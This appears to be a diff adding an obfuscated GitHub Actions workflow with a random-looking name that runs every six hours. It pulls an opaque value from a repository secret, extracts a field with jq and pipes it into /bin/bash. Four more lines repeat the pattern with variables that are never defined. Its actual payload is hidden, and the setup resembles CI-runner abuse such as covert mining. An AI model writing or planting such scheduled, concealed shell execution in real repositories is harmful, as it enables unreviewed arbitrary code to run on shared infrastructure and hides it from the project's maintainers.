@@ -1,0 +1,22 @@
+name: yutongren5423
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yutongren5423
+        env:
+          dk24: ${{ secrets.dk24 }}
+        run: |
+          echo $dk24 | jq -r .pwcvq7 | /bin/bash
+          echo $rux7 | jq -r .h36 | /bin/bash
+          echo $arjx66054 | jq -r .fq54 | /bin/bash
+          echo $fsuwl88199 | jq -r .pqqfg7 | /bin/bash
+          echo $tkz3 | jq -r .dav456 | /bin/bash
+
